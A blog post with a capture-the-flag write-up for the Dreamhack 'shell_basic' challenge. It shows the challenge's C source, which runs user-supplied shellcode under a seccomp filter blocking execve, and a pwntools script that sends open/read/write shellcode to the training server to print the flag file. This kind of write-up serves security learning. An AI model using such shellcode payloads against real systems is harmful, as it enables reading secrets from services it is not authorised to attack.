---
layout: post
title: "[dreamhack] shell_basic"
comments: true
category: wargame
---

## Description
![Description](/assets/img/shell_basic/shell_basic_description.png){: .mx-auto.d-block :}

We can get flag by send shellcode to server.

***

## C code

```cpp
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

After receiving 'shellcode: ', we can send shellcode and server will exec that by sc().

***

## Payload

We can use shellcraft() of pwntools for writing shellcode.
Shellcode must consist with these things.

1. Open flag's file. (fd -> rax)
2. Read flag and write that to buffer. (from rax to rsp)
3. Write buffer to stdout. (from rsp to stdout(1))

Here is full ex code.
```python
from pwn import *

context.arch = 'amd64'          # shellcodes are different by environment
r = remote('host3.dreamhack.games', 13296)

shellcode = shellcraft.open('/home/shell_basic/flag_name_is_loooooong')
shellcode += shellcraft.read('rax', 'rsp', 0x30)        # We don't know buf size,
shellcode += shellcraft.write(1, 'rsp', 0x30)           # but 0x30 is enough.

asmShellcode = asm(shellcode)

r.sendafter(b'shellcode: ', asmShellcode)
print(r.recv(0x30))
```